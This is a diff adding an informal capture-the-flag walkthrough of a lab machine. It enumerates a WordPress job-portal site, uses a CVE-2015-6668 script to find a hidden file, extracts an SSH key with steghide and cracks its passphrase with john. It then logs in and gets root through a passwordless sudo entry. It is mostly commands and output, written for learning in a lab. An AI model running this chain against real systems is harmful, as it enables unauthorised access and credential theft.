@@ -1,0 +1,215 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.10
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 22:41 EDT
+Nmap scan report for 10.10.10.10
+Host is up (0.16s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
+|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
+|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.7.3
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Job Portal &#8211; Just another WordPress site
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+kali@kali:~$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.10
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 22:42 EDT
+Warning: 10.10.10.10 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.10 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.10
+Host is up (0.16s latency).
+Not shown: 998 filtered ports, 998 open|filtered ports
+PORT   STATE  SERVICE
+22/tcp open   ssh
+80/tcp open   http
+22/udp closed ssh
+80/udp closed http
+
+
+
+/wp-content (Status: 301)
+/wp-includes (Status: 301)
+/wp-admin (Status: 301)
+/server-status (Status: 403)
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.10/wp-content -t 40 --wildcard true --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.10/wp-content
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/12 22:57:26 Starting gobuster
+===============================================================
+/themes (Status: 301)
+/uploads (Status: 301)
+/plugins (Status: 301)
+/upgrade (Status: 301)
+
+
+gobuster scan /plugins only get the akismet, and nothing is really interesting, both vulns are xss
+
+using wpscan now
+
+kali@kali:~$ wpscan --url http://10.10.10.10 -e u
+
+[i] User(s) Identified:
+
+[+] takis
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+
+
+
+
+wpscan --url http://10.10.10.10 --plugins-detection aggressive
+
+[+] akismet
+ | Location: http://10.10.10.10/wp-content/plugins/akismet/
+ | Last Updated: 2020-06-04T17:21:00.000Z
+ | Readme: http://10.10.10.10/wp-content/plugins/akismet/readme.txt
+ | [!] The version is out of date, the latest version is 4.1.6
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.10.10/wp-content/plugins/akismet/, status: 200
+ |
+ | Version: 3.3 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.10.10.10/wp-content/plugins/akismet/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://10.10.10.10/wp-content/plugins/akismet/readme.txt
+
+[+] job-manager
+ | Location: http://10.10.10.10/wp-content/plugins/job-manager/
+ | Latest Version: 0.7.25 (up to date)
+ | Last Updated: 2015-08-25T22:44:00.000Z
+ | Readme: http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.10.10/wp-content/plugins/job-manager/, status: 403
+ |
+ | Version: 7.2.5 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
+
+
+WordPress Plugin Job Manager 0.7.22 - Persistent Cross-Site Scripting                                               | php/webapps/37738.txt
+WordPress Plugin Job Manager 4.1.0 - Cross-Site Scripting                                                           | php/webapps/45031.txt
+
+
+nothing interesting there as well
+
+have to manully search it, then find out
+
+https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
+
+another thing is when click it shows 10.10.10.10/index.php/jobs/apply/8/
+
+use burp to go through the ids , then find a interesting title
+HackerAccessGranted
+
+use the exploit to find the exactly location
+
+
+kali@kali:/tmp$ python 123.py 
+  
+CVE-2015-6668  
+Title: CV filename disclosure on Job-Manager WP Plugin  
+Author: Evangelos Mourikis  
+Blog: https://vagmour.eu  
+Plugin URL: http://www.wp-jobmanager.com  
+Versions: <=0.7.25  
+
+Enter a vulnerable website: http://10.10.10.10
+Enter a file name: HackerAccessGranted
+
+[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+
+
+kali@kali:/tmp$ steghide extract -sf HackerAccessGranted.jpg 
+Enter passphrase: 
+wrote extracted data to "id_rsa".
+
+
+now we have a ssh key , but it's encrypted
+
+Proc-Type: 4,ENCRYPTED
+
+try with john
+
+create the hash
+kali@kali:/tmp$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+kali@kali:/tmp$ cat id_rsa.hash 
+id_rsa:$sshng$1$16$7265FC656C429769E4C1EEFC618E660C$1200$fc75dc501393dc98736e51fbb85f5587b7da6bbe971c876bfc2874a439c9ba78dd98b4bf95aab592e950dff445fd56b1b634f38ff57984111c2f919c1efddeb2b383952d2384c2f9de5029ae4a5ac1f6efc1b47e5f114826ecfbccb7ddfef0e8d4ab86ac2ad146c8a993269ee4a8aa942d77edb9962bd684ff87395f6c9f55338478e0dd5b4ac0a13cc6b9f5ad4e165f2b69f2d224c63e7743ecb31d9bfa393b902cf82843605369855d570e07c3cc78289ca302e22112ec993c1b3db43c9b2649d5826b317aa4812a848e0d42b9e477c9262aace4a5f5aa643cf7fa0e9fe3d1987fdeda3394d081375acb6a05aa85c758f84adc29b4b4c1aa2d9034d7ea0dbb05d2d07e77b7d146ec6a94df5c23ee7006581a5f1a8746c1e75875ee3394e04f55b36e95130a3a412bbff34288655170aea4e50b5d6f07e8ae1fba6cc8e6284e90bcc5db7ac66d434802f52259de5313274218f37f0741980eb12c358c3af1b8f5760d4218151d16de442b0d55329b4068c4ec0e7ff3254f1beb0b6c2f6c7ab00009e2b84a2d6fda1acff3df6aedce3bf0d5cd892a23df550d7fd8048c5dd7af2aa996d7b0cf6cfda30275583b4c9d60da0c4496957b53d9318a5fd135dc79500485a6f16c9663a7ec24d9e8de38c626ad4141f2575360a4d0b28df10ccd7328e85b56695a9b192b5ac7588c442d7df19d1c4645f65684ef4e5850c3be2b48f18f3041fe392164b17a7b49eff0083300a58640495c65ea835640afa9023e73e1685a052044afc6559857f292e878968ed3b27c5af56368597a3a5f415238f324b4da416cf3ead79f8cf9d49968e6da77d13f327bc17da48a96f927e1ea6407b9f45643b5b2c2dc79c7f18be6d69c63e62a8c32a94ea2b85dbcc3527d06da308275ab520b65aae6e6934c247fe974f2283b9283324fd29f65e811ee817ddb113de085834f17cbcbbe68d431f446b9b47fbec3e07bcd0b6a90d1d607900a5dd5d9386e571bef5162e5617507746bbb2805d864ab781c979f983dd7961af36b82dcef924f9401798da94fc064d83e88926b7ab8894b9e8d1292bdeff6be894f927b2f452d320754a9ffb7e7e700ef42ffc0894fd04d3853469a1a9b1c0e0d39f432fcf1dcef221c878384e57ddf715ad4125713335114f0119e378d2c57f783cb970731ccb57a15f45500a75b8ba9000ac8157942e223ec807cf8c82325749b592fe4757f6d826f55ab46b6690db8cb6e2bb34e1fc884ee4083c429cf9cf65ad275a81c3938c9de74465cf39e43e76bbe2b5dba3d15d35e2cd98447fec619d400464a5de7652eaf4f1f2095b6c324b56dd81b060c3f1bea6e14047ccfb8a9823e16a7d2e862a8aec5a11b883e7353378eb4a00a2ff9df9b32bcdb36dd3f132bbfb4ef1d4492584502e0ef502a20776a681fc96323c37a2d1fe64b9c19b2fdf4ba2154393a757aad5850efe2d129efaa95889dcdfa75f6520bf1489d6ec05f580cc1f57934b07e5cd4d413eaca68fe740cdd43489249fe6bbcca3c999eb47b0ee0e6f7c4a2e24a9c397f7e52455fab17e98ebc8504d7f62cb1730eed32ba8812170aeb8e52d3a91a22f1355448689bdb1a66b32d6092ca9b64e5f2613cb921b8af89628667f45340b9189814bdebc3eeaaa25f8aa2ace83c925e93a587472f0e484fbc0f3d72b132c83c1ead18a9fb1169cf
+
+
+
+kali@kali:/tmp$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+superpassword    (id_rsa)
+
+
+kali@kali:/tmp$ ssh -i id_rsa takis@10.10.10.10
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+39 updates are security updates.
+
+
+Last login: Fri May  5 23:05:36 2017
+takis@tenten:~$ 
+takis@tenten:~$ 
+takis@tenten:~$ ls -al
+total 48
+drwx------ 5 takis takis 4096 Apr 12  2017 .
+drwxr-xr-x 5 root  root  4096 Apr 12  2017 ..
+-rw------- 1 root  root     1 Dec 24  2017 .bash_history
+-rw-r--r-- 1 takis takis  220 Apr 12  2017 .bash_logout
+-rw-r--r-- 1 takis takis 3771 Apr 12  2017 .bashrc
+drwx------ 2 takis takis 4096 Apr 12  2017 .cache
+-rw------- 1 root  root   162 Apr 12  2017 .mysql_history
+drwxrwxr-x 2 takis takis 4096 Apr 12  2017 .nano
+-rw-r--r-- 1 takis takis  655 Apr 12  2017 .profile
+drwx------ 2 takis takis 4096 Apr 12  2017 .ssh
+-rw-r--r-- 1 takis takis    0 Apr 12  2017 .sudo_as_admin_successful
+-r--r--r-- 1 takis takis   33 Apr 12  2017 user.txt
+
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /bin/fuckin
+
+
+takis@tenten:~$ sudo /bin/fuckin sh
+# 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
+
+
